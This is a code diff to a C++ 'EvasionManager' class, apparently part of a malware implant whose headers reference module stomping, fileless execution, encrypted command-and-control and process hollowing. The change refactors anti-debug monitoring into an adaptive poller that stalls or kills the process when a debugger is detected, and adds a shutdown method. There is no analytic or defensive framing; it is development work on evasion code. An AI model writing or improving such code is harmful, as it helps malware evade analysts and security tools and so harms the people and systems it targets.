@@ -16,6 +16,7 @@
 #include "domain/common/ModuleStomping.hpp"
 #include "domain/common/FilelessExec.hpp"
 #include "domain/common/EncryptedC2.hpp"
+#include "domain/common/PerformanceOptimizer.hpp"
 
 namespace nuub::domain {
 
@@ -31,6 +32,9 @@ class EvasionManager {
     bool anti_sandbox_enabled_ = true;
     bool environment_keying_enabled_ = true;
     bool anti_forensic_enabled_ = false;
+
+    // Optimized polling (replaces detached thread)
+    std::unique_ptr<perf::AdaptivePoller> anti_debug_poller_;
 
 public:
     struct Config {
@@ -131,16 +135,20 @@ public:
             }
         }
 
-        // 5. Start anti-debug monitoring thread
+        // 5. Start anti-debug monitoring (adaptive, not detached)
         if (anti_debug_enabled_) {
-            std::thread([]() {
-                while (true) {
-                    Sleep(5000);
+            anti_debug_poller_ = std::make_unique<perf::AdaptivePoller>(
+                [this]() {
                     if (anti::AntiDebug::should_terminate()) {
+                        if (stealth_mode_) {
+                            while (true) Sleep(10000);
+                        }
                         ExitProcess(0);
                     }
-                }
-            }).detach();
+                },
+                std::chrono::milliseconds(5000)  // Start at 5s interval
+            );
+            anti_debug_poller_->start();
         }
 
         // 6. Self-inject via process hollowing if configured
@@ -291,6 +299,11 @@ public:
     bool is_anti_sandbox_enabled() const { return anti_sandbox_enabled_; }
     bool is_environment_keying_enabled() const { return environment_keying_enabled_; }
     bool is_anti_forensic_enabled() const { return anti_forensic_enabled_; }
+
+    // Stop all background monitoring (call before shutdown)
+    void shutdown() {
+        if (anti_debug_poller_) anti_debug_poller_->stop();
+    }
 };
 
 } // namespace nuub::domain
